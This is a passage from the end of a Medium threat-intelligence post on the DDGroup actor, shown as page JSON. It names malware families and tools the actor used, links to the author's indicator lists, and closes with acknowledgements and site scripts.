RAT","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_134":{"__typename":"Paragraph","id":"1d3124020da0_134","name":"153b","type":"OLI","href":null,"layout":null,"metadata":null,"text":"XWorm","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_135":{"__typename":"Paragraph","id":"1d3124020da0_135","name":"4d86","type":"P","href":null,"layout":null,"metadata":null,"text":"Additionally, I observed the use of:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_136":{"__typename":"Paragraph","id":"1d3124020da0_136","name":"17e7","type":"OLI","href":null,"layout":null,"metadata":null,"text":"https:\u002F\u002Fgithub.com\u002Foptiv\u002FFreeze.rs","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":34,"href":"https:\u002F\u002Fgithub.com\u002Foptiv\u002FFreeze.rs","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_137":{"__typename":"Paragraph","id":"1d3124020da0_137","name":"ad42","type":"OLI","href":null,"layout":null,"metadata":null,"text":"https:\u002F\u002Fgithub.com\u002Fsigoden\u002Fdufs","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":31,"href":"https:\u002F\u002Fgithub.com\u002Fsigoden\u002Fdufs","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_138":{"__typename":"Paragraph","id":"1d3124020da0_138","name":"75f5","type":"P","href":null,"layout":null,"metadata":null,"text":"While the actor currently seems to favor servers by the German Hosting Provider Contabo, there seems to be no preference in regards to Dynamic DNS providers.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":80,"end":87,"href":"https:\u002F\u002Fcontabo.com\u002Fde\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_139":{"__typename":"Paragraph","id":"1d3124020da0_139","name":"727d","type":"P","href":null,"layout":null,"metadata":null,"text":"I really hope this article will be a reason for a CTI company with more resources than me to look into this matter.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_140":{"__typename":"Paragraph","id":"1d3124020da0_140","name":"3a09","type":"P","href":null,"layout":null,"metadata":null,"text":"Meanwhile, a list of all associated C2 IP addresses, a list of all associated dynamic DNS domains, and a joint list showing their association can be found here:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_141":{"__typename":"Paragraph","id":"1d3124020da0_141","name":"3f9b","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"MalwareConfigLists\u002FDDGroup at main · Gi7w0rm\u002FMalwareConfigLists\nJust some lists of Malware Configs. Contribute to Gi7w0rm\u002FMalwareConfigLists development by creating an account on…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":189,"href":"https:\u002F\u002Fgithub.com\u002FGi7w0rm\u002FMalwareConfigLists\u002Ftree\u002Fmain\u002FDDGroup","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":63,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":64,"end":179,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FGi7w0rm\u002FMalwareConfigLists\u002Ftree\u002Fmain\u002FDDGroup","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*dF5UkLaSH8l44dQt"}},"Paragraph:1d3124020da0_142":{"__typename":"Paragraph","id":"1d3124020da0_142","name":"0c88","type":"H4","href":null,"layout":null,"metadata":null,"text":"Chapter 9: Thank you","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_143":{"__typename":"Paragraph","id":"1d3124020da0_143","name":"5125","type":"P","href":null,"layout":null,"metadata":null,"text":"Well, this chapter has no technical details in it. However, I have to thank some individuals for their immense help with the work on this investigation. All individuals in the list below played a role in this and I am very thankful to each and every one of them:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_144":{"__typename":"Paragraph","id":"1d3124020da0_144","name":"3155","type":"ULI","href":null,"layout":null,"metadata":null,"text":"RussianPanda","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":12,"href":"https:\u002F\u002Ftwitter.com\u002FAnFam17","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_145":{"__typename":"Paragraph","id":"1d3124020da0_145","name":"3768","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Fate112","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":7,"href":"https:\u002F\u002Ftwitter.com\u002Ftosscoinwitcher","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_146":{"__typename":"Paragraph","id":"1d3124020da0_146","name":"e354","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Ali Aqeel","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":9,"href":"https:\u002F\u002Ftwitter.com\u002Faaqeel87","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_147":{"__typename":"Paragraph","id":"1d3124020da0_147","name":"aeed","type":"ULI","href":null,"layout":null,"metadata":null,"text":"cxiao","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":5,"href":"https:\u002F\u002Finfosec.exchange\u002F@cxiao","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_148":{"__typename":"Paragraph","id":"1d3124020da0_148","name":"6f8c","type":"ULI","href":null,"layout":null,"metadata":null,"text":"fr0gger","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":7,"href":"https:\u002F\u002Ftwitter.com\u002Ffr0gger_","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_149":{"__typename":"Paragraph","id":"1d3124020da0_149","name":"217f","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Israel Torres","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":13,"href":"https:\u002F\u002Ftwitter.com\u002FIsrael_Torres","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_150":{"__typename":"Paragraph","id":"1d3124020da0_150","name":"5a4a","type":"P","href":null,"layout":null,"metadata":null,"text":"I also want to thank every reader of this post who makes it to the end. I always hope to make these posts entertaining and educational but this is by far my longest piece so far and if you made it here I really appreciate having had your attention.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_151":{"__typename":"Paragraph","id":"1d3124020da0_151","name":"fdc8","type":"P","href":null,"layout":null,"metadata":null,"text":"Before you go, you might want to check out my link tree: https:\u002F\u002Flinktr.ee\u002Fgi7w0rm or consider a donation via Kofi to help me finance my research.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":57,"end":82,"href":"https:\u002F\u002Flinktr.ee\u002Fgi7w0rm","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":110,"end":114,"href":"https:\u002F\u002Fko-fi.com\u002Fgi7w0rm","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_152":{"__typename":"Paragraph","id":"1d3124020da0_152","name":"0932","type":"P","href":null,"layout":null,"metadata":null,"text":"Have a nice day. \nCheers ❤","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_153":{"__typename":"Paragraph","id":"1d3124020da0_153","name":"eb87","type":"P","href":null,"layout":null,"metadata":null,"text":"((*)Disclaimer: I am not in any way or form affiliated with Validin LLC, but I have known their CEO for a while and I really like the work they do. Check them out here: https:\u002F\u002Fvalidin.com\u002F )","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":169,"end":189,"href":"https:\u002F\u002Fvalidin.com\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"PostViewerEdge:postId:d3b3020625a4-viewerId:lo_44ffdc9afcea":{"__typename":"PostViewerEdge","shouldIndexPostForExternalSearch":true,"id":"postId:d3b3020625a4-viewerId:lo_44ffdc9afcea"},"Tag:cybersecurity":{"__typename":"Tag","id":"cybersecurity","displayTitle":"Cybersecurity","normalizedTagSlug":"cybersecurity"},"Tag:malware":{"__typename":"Tag","id":"malware","displayTitle":"Malware","normalizedTagSlug":"malware"},"Tag:threat-intelligence":{"__typename":"Tag","id":"threat-intelligence","displayTitle":"Threat Intelligence","normalizedTagSlug":"threat-intelligence"},"Tag:ioc":{"__typename":"Tag","id":"ioc","displayTitle":"Ioc","normalizedTagSlug":"ioc"},"Tag:technology":{"__typename":"Tag","id":"technology","displayTitle":"Technology","normalizedTagSlug":"technology"},"Post:d3b3020625a4":{"__typename":"Post","id":"d3b3020625a4","collection":null,"content({\"postMeteringOptions\":{}})":{"__typename":"PostContent","isLockedPreviewOnly":false,"bodyModel":{"__typename":"RichText","sections":[{"__typename":"Section","name":"5b78","startIndex":0,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"d555","startIndex":2,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"5e9d","startIndex":4,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"733b","startIndex":23,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"b301","startIndex":30,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"1026","startIndex":55,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"3236","startIndex":83,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"84be","startIndex":110,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"368f","startIndex":124,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"d153","startIndex":142,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null}],"paragraphs":[{"__ref":"Paragraph:1d3124020da0_0"},{"__ref":"Paragraph:1d3124020da0_1"},{"__ref":"Paragraph:1d3124020da0_2"},{"__ref":"Paragraph:1d3124020da0_3"},{"__ref":"Paragraph:1d3124020da0_4"},{"__ref":"Paragraph:1d3124020da0_5"},{"__ref":"Paragraph:1d3124020da0_6"},{"__ref":"Paragraph:1d3124020da0_7"},{"__ref":"Paragraph:1d3124020da0_8"},{"__ref":"Paragraph:1d3124020da0_9"},{"__ref":"Paragraph:1d3124020da0_10"},{"__ref":"Paragraph:1d3124020da0_11"},{"__ref":"Paragraph:1d3124020da0_12"},{"__ref":"Paragraph:1d3124020da0_13"},{"__ref":"Paragraph:1d3124020da0_14"},{"__ref":"Paragraph:1d3124020da0_15"},{"__ref":"Paragraph:1d3124020da0_16"},{"__ref":"Paragraph:1d3124020da0_17"},{"__ref":"Paragraph:1d3124020da0_18"},{"__ref":"Paragraph:1d3124020da0_19"},{"__ref":"Paragraph:1d3124020da0_20"},{"__ref":"Paragraph:1d3124020da0_21"},{"__ref":"Paragraph:1d3124020da0_22"},{"__ref":"Paragraph:1d3124020da0_23"},{"__ref":"Paragraph:1d3124020da0_24"},{"__ref":"Paragraph:1d3124020da0_25"},{"__ref":"Paragraph:1d3124020da0_26"},{"__ref":"Paragraph:1d3124020da0_27"},{"__ref":"Paragraph:1d3124020da0_28"},{"__ref":"Paragraph:1d3124020da0_29"},{"__ref":"Paragraph:1d3124020da0_30"},{"__ref":"Paragraph:1d3124020da0_31"},{"__ref":"Paragraph:1d3124020da0_32"},{"__ref":"Paragraph:1d3124020da0_33"},{"__ref":"Paragraph:1d3124020da0_34"},{"__ref":"Paragraph:1d3124020da0_35"},{"__ref":"Paragraph:1d3124020da0_36"},{"__ref":"Paragraph:1d3124020da0_37"},{"__ref":"Paragraph:1d3124020da0_38"},{"__ref":"Paragraph:1d3124020da0_39"},{"__ref":"Paragraph:1d3124020da0_40"},{"__ref":"Paragraph:1d3124020da0_41"},{"__ref":"Paragraph:1d3124020da0_42"},{"__ref":"Paragraph:1d3124020da0_43"},{"__ref":"Paragraph:1d3124020da0_44"},{"__ref":"Paragraph:1d3124020da0_45"},{"__ref":"Paragraph:1d3124020da0_46"},{"__ref":"Paragraph:1d3124020da0_47"},{"__ref":"Paragraph:1d3124020da0_48"},{"__ref":"Paragraph:1d3124020da0_49"},{"__ref":"Paragraph:1d3124020da0_50"},{"__ref":"Paragraph:1d3124020da0_51"},{"__ref":"Paragraph:1d3124020da0_52"},{"__ref":"Paragraph:1d3124020da0_53"},{"__ref":"Paragraph:1d3124020da0_54"},{"__ref":"Paragraph:1d3124020da0_55"},{"__ref":"Paragraph:1d3124020da0_56"},{"__ref":"Paragraph:1d3124020da0_57"},{"__ref":"Paragraph:1d3124020da0_58"},{"__ref":"Paragraph:1d3124020da0_59"},{"__ref":"Paragraph:1d3124020da0_60"},{"__ref":"Paragraph:1d3124020da0_61"},{"__ref":"Paragraph:1d3124020da0_62"},{"__ref":"Paragraph:1d3124020da0_63"},{"__ref":"Paragraph:1d3124020da0_64"},{"__ref":"Paragraph:1d3124020da0_65"},{"__ref":"Paragraph:1d3124020da0_66"},{"__ref":"Paragraph:1d3124020da0_67"},{"__ref":"Paragraph:1d3124020da0_68"},{"__ref":"Paragraph:1d3124020da0_69"},{"__ref":"Paragraph:1d3124020da0_70"},{"__ref":"Paragraph:1d3124020da0_71"},{"__ref":"Paragraph:1d3124020da0_72"},{"__ref":"Paragraph:1d3124020da0_73"},{"__ref":"Paragraph:1d3124020da0_74"},{"__ref":"Paragraph:1d3124020da0_75"},{"__ref":"Paragraph:1d3124020da0_76"},{"__ref":"Paragraph:1d3124020da0_77"},{"__ref":"Paragraph:1d3124020da0_78"},{"__ref":"Paragraph:1d3124020da0_79"},{"__ref":"Paragraph:1d3124020da0_80"},{"__ref":"Paragraph:1d3124020da0_81"},{"__ref":"Paragraph:1d3124020da0_82"},{"__ref":"Paragraph:1d3124020da0_83"},{"__ref":"Paragraph:1d3124020da0_84"},{"__ref":"Paragraph:1d3124020da0_85"},{"__ref":"Paragraph:1d3124020da0_86"},{"__ref":"Paragraph:1d3124020da0_87"},{"__ref":"Paragraph:1d3124020da0_88"},{"__ref":"Paragraph:1d3124020da0_89"},{"__ref":"Paragraph:1d3124020da0_90"},{"__ref":"Paragraph:1d3124020da0_91"},{"__ref":"Paragraph:1d3124020da0_92"},{"__ref":"Paragraph:1d3124020da0_93"},{"__ref":"Paragraph:1d3124020da0_94"},{"__ref":"Paragraph:1d3124020da0_95"},{"__ref":"Paragraph:1d3124020da0_96"},{"__ref":"Paragraph:1d3124020da0_97"},{"__ref":"Paragraph:1d3124020da0_98"},{"__ref":"Paragraph:1d3124020da0_99"},{"__ref":"Paragraph:1d3124020da0_100"},{"__ref":"Paragraph:1d3124020da0_101"},{"__ref":"Paragraph:1d3124020da0_102"},{"__ref":"Paragraph:1d3124020da0_103"},{"__ref":"Paragraph:1d3124020da0_104"},{"__ref":"Paragraph:1d3124020da0_105"},{"__ref":"Paragraph:1d3124020da0_106"},{"__ref":"Paragraph:1d3124020da0_107"},{"__ref":"Paragraph:1d3124020da0_108"},{"__ref":"Paragraph:1d3124020da0_109"},{"__ref":"Paragraph:1d3124020da0_110"},{"__ref":"Paragraph:1d3124020da0_111"},{"__ref":"Paragraph:1d3124020da0_112"},{"__ref":"Paragraph:1d3124020da0_113"},{"__ref":"Paragraph:1d3124020da0_114"},{"__ref":"Paragraph:1d3124020da0_115"},{"__ref":"Paragraph:1d3124020da0_116"},{"__ref":"Paragraph:1d3124020da0_117"},{"__ref":"Paragraph:1d3124020da0_118"},{"__ref":"Paragraph:1d3124020da0_119"},{"__ref":"Paragraph:1d3124020da0_120"},{"__ref":"Paragraph:1d3124020da0_121"},{"__ref":"Paragraph:1d3124020da0_122"},{"__ref":"Paragraph:1d3124020da0_123"},{"__ref":"Paragraph:1d3124020da0_124"},{"__ref":"Paragraph:1d3124020da0_125"},{"__ref":"Paragraph:1d3124020da0_126"},{"__ref":"Paragraph:1d3124020da0_127"},{"__ref":"Paragraph:1d3124020da0_128"},{"__ref":"Paragraph:1d3124020da0_129"},{"__ref":"Paragraph:1d3124020da0_130"},{"__ref":"Paragraph:1d3124020da0_131"},{"__ref":"Paragraph:1d3124020da0_132"},{"__ref":"Paragraph:1d3124020da0_133"},{"__ref":"Paragraph:1d3124020da0_134"},{"__ref":"Paragraph:1d3124020da0_135"},{"__ref":"Paragraph:1d3124020da0_136"},{"__ref":"Paragraph:1d3124020da0_137"},{"__ref":"Paragraph:1d3124020da0_138"},{"__ref":"Paragraph:1d3124020da0_139"},{"__ref":"Paragraph:1d3124020da0_140"},{"__ref":"Paragraph:1d3124020da0_141"},{"__ref":"Paragraph:1d3124020da0_142"},{"__ref":"Paragraph:1d3124020da0_143"},{"__ref":"Paragraph:1d3124020da0_144"},{"__ref":"Paragraph:1d3124020da0_145"},{"__ref":"Paragraph:1d3124020da0_146"},{"__ref":"Paragraph:1d3124020da0_147"},{"__ref":"Paragraph:1d3124020da0_148"},{"__ref":"Paragraph:1d3124020da0_149"},{"__ref":"Paragraph:1d3124020da0_150"},{"__ref":"Paragraph:1d3124020da0_151"},{"__ref":"Paragraph:1d3124020da0_152"},{"__ref":"Paragraph:1d3124020da0_153"}]},"validatedShareKey":"","shareKeyCreator":null},"creator":{"__ref":"User:fa7639fc99f0"},"inResponseToEntityType":null,"isLocked":false,"isMarkedPaywallOnly":false,"lockedSource":"LOCKED_POST_SOURCE_NONE","mediumUrl":"https:\u002F\u002Fgi7w0rm.medium.com\u002Funcovering-ddgroup-a-long-time-threat-actor-d3b3020625a4","primaryTopic":null,"topics":[{"__typename":"Topic","slug":"cybersecurity"}],"isPublished":true,"latestPublishedVersion":"1d3124020da0","visibility":"PUBLIC","postResponses":{"__typename":"PostResponses","count":0},"clapCount":31,"allowResponses":true,"isLimitedState":false,"title":"Uncovering DDGroup — A long-time threat actor","isSeries":false,"sequence":null,"uniqueSlug":"uncovering-ddgroup-a-long-time-threat-actor-d3b3020625a4","socialTitle":"","socialDek":"","canonicalUrl":"","metaDescription":"","latestPublishedAt":1694151387927,"readingTime":15.518867924528301,"previewContent":{"__typename":"PreviewContent","subtitle":"Sometimes when investigating malware, you come across something that calls your attention. Something that seems odd, something that seems…"},"previewImage":{"__ref":"ImageMetadata:1*GFtbwtoJ3STVtn-smfpLsg.png"},"isShortform":false,"seoTitle":"","firstPublishedAt":1694151387927,"updatedAt":1710876225088,"shortformType":"SHORTFORM_TYPE_LINK","seoDescription":"","viewerEdge":{"__ref":"PostViewerEdge:postId:d3b3020625a4-viewerId:lo_44ffdc9afcea"},"isSuspended":false,"license":"ALL_RIGHTS_RESERVED","tags":[{"__ref":"Tag:cybersecurity"},{"__ref":"Tag:malware"},{"__ref":"Tag:threat-intelligence"},{"__ref":"Tag:ioc"},{"__ref":"Tag:technology"}],"isNewsletter":false,"statusForCollection":null,"pendingCollection":null,"detectedLanguage":"en","wordCount":3715,"layerCake":0}}</script><script>window.__MIDDLEWARE_STATE__={"session":{"xsrf":""},"cache":{"cacheStatus":"HIT"}}</script><script src="https://cdn-client.medium.com/lite/static/js/manifest.24f082fe.js"></script><script src="https://cdn-client.medium.com/lite/static/js/9865.1496d74a.js"></script><script src="https://cdn-client.medium.com/lite/static/js/main.e66fdbd5.js"></script><script src="https://cdn-client.medium.com/lite/static/js/instrumentation.d9108df7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/reporting.ff22a7a5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5049.d1ead72d.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4810.6318add7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6618.db187378.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/1386.90da86c2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9977.5b3eb23a.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/719.0e220795.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5250.9f9e01d2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6349.b071a958.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2648.26563adf.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8393.826a25fb.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/1443.a8a73f48.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3735.afb7e926.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5642.cee3e6b2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6546.cd03f950.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6834.08de95de.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/1781.db373833.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2420.2a5e2d95.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/839.ca7937c2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7975.d195c6f1.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2106.21ff89d3.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7394.e27cfbf2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2961.00a48598.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/230.ec2ef161.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4391.59acaed3.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostPage.MainContent.6aeac6a8.chunk.js"></script><script>window.main();</script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'8dd76994df1ae2ac',t:'MTczMDc1Mjc1Ni4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"8dd76994df1ae2ac","version":"2024.10.4","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"token":"0b5f665943484354a59c39c6833f7078","b":1}' crossorigin="anonymous"></script>
</body></html>